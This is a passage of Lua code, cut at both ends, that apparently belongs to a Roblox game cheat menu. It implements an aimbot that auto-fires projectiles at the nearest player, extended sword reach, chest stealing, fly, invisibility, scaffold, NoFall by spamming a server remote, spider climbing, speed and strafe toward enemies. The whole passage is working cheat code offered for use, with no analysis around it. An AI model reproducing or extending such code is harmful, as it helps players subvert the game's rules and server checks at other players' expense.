		task.spawn(function()
			repeat
				task.wait(0.1)

				task.spawn(function()		
					if IsAlive(LocalPlayer) then	
						local NearestPlayer, NearestPlayerDistance = FindNearestPlayer(math.huge)

						if NearestPlayer and (AntiVoidPart and NearestPlayer.Character.PrimaryPart.Position.Y >= AntiVoidPart.Position.Y or true) and not NearestPlayer.Character:FindFirstChildOfClass("ForceField") and NearestPlayerDistance > Settings.KillAura.Range then
							local BestBow = GetBow()

							task.spawn(function()
								if HasItem("vacuum") then
									local Vacuum = ReplicatedStorage.Inventories:FindFirstChild(LocalPlayer.Name):FindFirstChild("vacuum")

									task.spawn(function()
										if Settings.Aimbot.ToolCheck == false then	
											SwitchItem("vacuum")
										end
									end)

									ShootProjectile(Vacuum, "ghost")
								end
							end)

							task.spawn(function()
								if BestBow and HasItem(BestBow.itemType) and HasItem("arrow") then
									local Bow = ReplicatedStorage.Inventories:FindFirstChild(LocalPlayer.Name):FindFirstChild(BestBow.itemType)

									task.spawn(function()
										if Settings.Aimbot.ToolCheck == false then	
											SwitchItem(BestBow.itemType)
										end
									end)

									ShootProjectile(Bow, "arrow")
								end
							end)					

							task.spawn(function()
								if HasItem("fireball") and not (HasItem("arrow") and (BestBow and HasItem(BestBow.itemType) or true)) then
									local FireBall = ReplicatedStorage.Inventories:FindFirstChild(LocalPlayer.Name):FindFirstChild("fireball")

									task.spawn(function()
										if Settings.Aimbot.ToolCheck == false then	
											SwitchItem("fireball")
										end
									end)

									ShootProjectile(FireBall, "fireball")
								end

								if HasItem("snowball") and not (HasItem("arrow") and (BestBow and HasItem(BestBow.itemType) or true))  then
									local SnowBall = ReplicatedStorage.Inventories:FindFirstChild(LocalPlayer.Name):FindFirstChild("snowball")

									task.spawn(function()
										if Settings.Aimbot.ToolCheck == false then	
											SwitchItem("snowball")
										end
									end)

									ShootProjectile(SnowBall, "snowball")
								end
							end)

							task.spawn(function()
								if HasItem("lasso") then
									local Lasso = ReplicatedStorage.Inventories:FindFirstChild(LocalPlayer.Name):FindFirstChild("lasso")

									task.spawn(function()
										if Settings.Aimbot.ToolCheck == false then	
											SwitchItem("lasso")
										end
									end)

									ShootProjectile(Lasso, "lasso")
								end
							end)
						end
					end
				end)
			until Settings.Aimbot.Value == false
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(CombatTab, Settings.Aimbot.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Aimbot.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Aimbot.KeyBind then
					Settings.Aimbot.Value = not Settings.Aimbot.Value

					if Settings.Aimbot.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.Aimbot.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateMiniToggle(CombatTab, "ToolCheck", Settings.Aimbot.ToolCheck, LayoutOrder + 2, function(CallBack)
					Settings.Aimbot.ToolCheck = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local Reach, DropDownButton, LayoutOrder, UIGradient = CreateToggle(CombatTab, "Reach", Settings.Reach.Value, function(CallBack)
		Settings.Reach.Value = CallBack

		local OldReach = CombatConstant.RAYCAST_SWORD_CHARACTER_DISTANCE

		task.spawn(function()
			if Settings.Reach.Value == true then
				CombatConstant.RAYCAST_SWORD_CHARACTER_DISTANCE = 20
			end
		end)

		task.spawn(function()
			if Settings.Reach.Value == false then
				CombatConstant.RAYCAST_SWORD_CHARACTER_DISTANCE = OldReach
			end
		end)		
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(CombatTab, Settings.Reach.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Reach.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Reach.KeyBind then
					Settings.Reach.Value = not Settings.Reach.Value

					if Settings.Reach.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.Reach.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local Sprint, DropDownButton, LayoutOrder, UIGradient = CreateToggle(CombatTab, "Sprint", Settings.Sprint.Value, function(CallBack)
		Settings.Sprint.Value = CallBack

		local OldSprintFunction

		task.spawn(function()
			if Settings.Sprint.Value == true and KnitClientGotten == true then
				OldSprintFunction = SprintController.stopSprinting

				SprintController.stopSprinting = function(...)
					local Function = OldSprintFunction(...)

					SprintController:startSprinting()
					return Function
				end

				task.spawn(function()
					SprintController:startSprinting()
				end)

				LocalPlayer.CharacterAdded:Connect(function()
					SprintController:stopSprinting()
				end)
			end
		end)

		task.spawn(function()
			if Settings.Sprint.Value == false and KnitClientGotten == true then
				SprintController.stopSprinting = OldSprintFunction

				SprintController:stopSprinting()
			end
		end)		
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(CombatTab, Settings.Sprint.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Sprint.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Sprint.KeyBind then
					Settings.Sprint.Value = not Settings.Sprint.Value

					if Settings.Sprint.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.Sprint.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local NoPlacementCps, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "NoPlacementCps", Settings.NoPlacementCps.Value, function(CallBack)
		Settings.NoPlacementCps.Value = CallBack

		local OldCps = nil

		task.spawn(function()
			if Settings.NoPlacementCps.Value == true then
				OldCps = PlacementCPS.BLOCK_PLACE_CPS

				PlacementCPS.BLOCK_PLACE_CPS = math.huge
			end
		end)

		task.spawn(function()
			if Settings.NoPlacementCps.Value == false then
				PlacementCPS.BLOCK_PLACE_CPS = OldCps
			end
		end)		
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.NoPlacementCps.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.NoPlacementCps.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.NoPlacementCps.KeyBind then
					Settings.NoPlacementCps.Value = not Settings.NoPlacementCps.Value

					if Settings.NoPlacementCps.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.NoPlacementCps.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local ChestStealer, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "ChestStealer", Settings.ChestStealer.Value, function(CallBack)
		Settings.ChestStealer.Value = CallBack

		task.spawn(function()	
			repeat
				task.wait(0.1)

				task.spawn(function()
					if IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
						local NearestChest = FindNearestChest()

						if NearestChest then
							StealChest(NearestChest)
						end
					end
				end)
			until Settings.ChestStealer.Value == false
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.ChestStealer.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.ChestStealer.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.ChestStealer.KeyBind then
					Settings.ChestStealer.Value = not Settings.ChestStealer.Value

					if Settings.ChestStealer.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.ChestStealer.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(BlatantTab, "Range", Settings.ChestStealer.Range, 30, LayoutOrder + 2, function(CallBack)
					Settings.ChestStealer.Range = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local InfiniteJump, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "InfiniteJump", Settings.InfiniteJump.Value, function(CallBack)
		Settings.InfiniteJump.Value = CallBack

		task.spawn(function()
			UserInputService.JumpRequest:Connect(function()
				if IsAlive(LocalPlayer) and Settings.InfiniteJump.Value == true then
					LocalPlayer.Character.Humanoid:ChangeState("Jumping")
				end
			end)
		end)	
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.InfiniteJump.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.InfiniteJump.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.InfiniteJump.KeyBind then
					Settings.InfiniteJump.Value = not Settings.InfiniteJump.Value

					if Settings.InfiniteJump.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.InfiniteJump.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local InfiniteFly, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "InfiniteFly", Settings.InfiniteFly.Value, function(CallBack)
		Settings.InfiniteFly.Value = CallBack

		task.spawn(function()
			if Settings.InfiniteFly.Value == true and InfiniteFlyValue == false then
				InfiniteFlyValue = true
				InfFly()
			end

			if Settings.InfiniteFly.Value == false and InfiniteFlyValue == true then
				InfiniteFlyValue = false
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.InfiniteFly.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.InfiniteFly.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.InfiniteFly.KeyBind then
					Settings.InfiniteFly.Value = not Settings.InfiniteFly.Value						

					if Settings.InfiniteFly.Value == true then
						task.spawn(function()
							InfiniteFlyValue = true
							InfFly()
						end)

						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.InfiniteFly.Value == false then
						InfiniteFlyValue = false
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local HighJump, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "HighJump", Settings.HighJump.Value, function(CallBack)
		Settings.HighJump.Value = CallBack

		task.spawn(function()
			if IsAlive(LocalPlayer) and Settings.HighJump.Value == true then
				LocalPlayer.Character.PrimaryPart.Velocity = LocalPlayer.Character.PrimaryPart.Velocity + Vector3.new(0, 150, 0)

				task.wait(0.2)

				Settings.HighJump.Value = false
			end
		end)	
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.HighJump.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.HighJump.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.HighJump.KeyBind then
					Settings.HighJump.Value = not Settings.HighJump.Value

					if Settings.HighJump.Value == true then
						task.spawn(function()
							if IsAlive(LocalPlayer) then
								LocalPlayer.Character.PrimaryPart.Velocity = LocalPlayer.Character.PrimaryPart.Velocity + Vector3.new(0, 150, 0)

								task.wait(0.2)

								Settings.HighJump.Value = false
								UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
							end
						end)

						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.HighJump.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local Invisible, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "Invisible", Settings.Invisible.Value, function(CallBack)
		Settings.Invisible.Value = CallBack

		task.spawn(function()
			if Settings.Invisible.Value == true then
				Invisibility()
			end

			task.spawn(function()
				LocalPlayer.CharacterAdded:Connect(function()
					task.wait(0.3)

					if Settings.Invisible.Value == true and IsAlive(LocalPlayer) then
						Invisibility()
					end
				end)
			end)
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.Invisible.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Invisible.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Invisible.KeyBind then
					Settings.Invisible.Value = not Settings.Invisible.Value

					task.spawn(function()
						if Settings.Invisible.Value == true then
							Invisibility()
						end

						task.spawn(function()
							LocalPlayer.CharacterAdded:Connect(function()
								task.wait(0.3)

								if Settings.Invisible.Value == true and IsAlive(LocalPlayer) then
									Invisibility()
								end
							end)
						end)
					end)

					if Settings.Invisible.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
					end

					if Settings.Invisible.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local Scaffold, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "Scaffold", Settings.Scaffold.Value, function(CallBack)
		Settings.Scaffold.Value = CallBack

		task.spawn(function()
			repeat
				task.wait()

				if IsAlive(LocalPlayer) and FlyValue == false and GetMatchState() ~= 0 then
					for i = 1, Settings.Scaffold.ExpandDistance do
						local ScaffoldCFrame = LocalPlayer.Character.PrimaryPart.Position + (LocalPlayer.Character.Humanoid.MoveDirection * (i * 3.5)) - Vector3.new(0, (LocalPlayer.Character.PrimaryPart.Size.Y / 2) + (LocalPlayer.Character.Humanoid.HipHeight + 1.5), 0)
						local Position = GetServerPosition(ScaffoldCFrame)
						local Block = GetBlock()

						if Block then
							PlaceBlock(Position, Block)
						end				
					end
				end
			until Settings.Scaffold.Value == false			
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.Scaffold.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Scaffold.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Scaffold.KeyBind then
					Settings.Scaffold.Value = not Settings.Scaffold.Value

					if Settings.Scaffold.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.Scaffold.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(BlatantTab, "ExpandDistance", Settings.Scaffold.ExpandDistance, 4, LayoutOrder + 2, function(CallBack)
					Settings.Scaffold.ExpandDistance = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)
task.spawn(function()
	local NoFall, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "NoFall", Settings.NoFall.Value, function(CallBack)
		Settings.NoFall.Value = CallBack

		task.spawn(function()
			repeat
				task.wait(0.5)

				if IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
					GroundHitRemote:FireServer()
				end
			until Settings.NoFall.Value == false
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.NoFall.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.NoFall.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.NoFall.KeyBind then
					Settings.NoFall.Value = not Settings.NoFall.Value

					if Settings.NoFall.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.NoFall.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local Spider, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "Spider", Settings.Spider.Value, function(CallBack)
		Settings.Spider.Value = CallBack

		task.spawn(function()
			if Settings.Spider.Value == true then
				task.spawn(function()
					repeat
						task.wait()

						if IsAlive(LocalPlayer) and FlyValue == false then											
							local MoveDirection = LocalPlayer.Character.Humanoid.MoveDirection

							local BlockRay = FindPlacedBlock(LocalPlayer.Character.PrimaryPart.Position + ((MoveDirection * 2) - Vector3.new(0, LocalPlayer.Character.Humanoid.HipHeight, 0)))				

							if BlockRay then
								LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(0, Settings.Spider.Speed, LocalPlayer.Character.PrimaryPart.Velocity.Z)							
							end
						end
					until Settings.Spider.Value == false
				end)
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.Spider.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Spider.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Spider.KeyBind then
					Settings.Spider.Value = not Settings.Spider.Value

					if Settings.Spider.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.Spider.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(BlatantTab, "Speed", Settings.Spider.Speed, 50, LayoutOrder + 2, function(CallBack)
					Settings.Spider.Speed = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local Speed, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "Speed", Settings.Speed.Value, function(CallBack)
		Settings.Speed.Value = CallBack
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.Speed.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Speed.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Speed.KeyBind then
					Settings.Speed.Value = not Settings.Speed.Value

					if Settings.Speed.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.Speed.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(BlatantTab, "Speed", Settings.Speed.Speed, 23, LayoutOrder + 2, function(CallBack)
					Settings.Speed.Speed = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local Strafe, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "Strafe", Settings.Strafe.Value, function(CallBack)
		Settings.Strafe.Value = CallBack

		task.spawn(function()
			repeat
				task.wait()

				if IsAlive(LocalPlayer) then
					local NearestEntity, NearestEntityDistance = FindNearestEntity(Settings.Strafe.Range)

					if GetMatchState() ~= 0 and NearestEntity and (AntiVoidPart and NearestEntity.PrimaryPart.Position.Y > AntiVoidPart.Position.Y or true) then
						local TweenInformation = TweenInfo.new((NearestEntityDistance / Settings.Strafe.Speed), Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)
						local StrafeTween = TweenService:Create(LocalPlayer.Character.PrimaryPart, TweenInformation, {CFrame = (Settings.Strafe.GoBackwards and CFrame.new(NearestEntity.PrimaryPart.Position - NearestEntity.PrimaryPart.CFrame.LookVector) or NearestEntity.PrimaryPart.Position)})

						StrafeTween:Play()
					end
				end				
			until Settings.Strafe.Value == false
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.Strafe.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Strafe.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Strafe.KeyBind then
					Settings.Strafe.Value = not Settings.Strafe.Value

					if Settings.Strafe.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.Strafe.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateMiniToggle(BlatantTab, "GoBackwards", Settings.Strafe.GoBackwards, LayoutOrder + 2, function(CallBack)
					Settings.Strafe.GoBackwards = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(BlatantTab, "Speed", Settings.Strafe.Speed, 22, LayoutOrder + 3, function(CallBack)
					Settings.Strafe.Speed = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(BlatantTab, "Range", Settings.Strafe.Range, 20, LayoutOrder + 4, function(CallBack)
					Settings.Strafe.Range = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local Fly, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "Fly", Settings.Fly.Value, function(CallBack)
		Settings.Fly.Value = CallBack

		task.spawn(function()
			if Settings.Fly.Value == true then
				FlyValue = true
				FlyMe()
			end
		end)

		task.spawn(function()
			if Settings.Fly.Value == false then
				FlyValue = false
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.Fly.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Fly.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Fly.KeyBind then
					Settings.Fly.Value = not Settings.Fly.Value

					if Settings.Fly.Value == true then
						task.spawn(function()
							if Settings.Fly.Value == true then
								FlyValue = true
								FlyMe()
							end
						end)

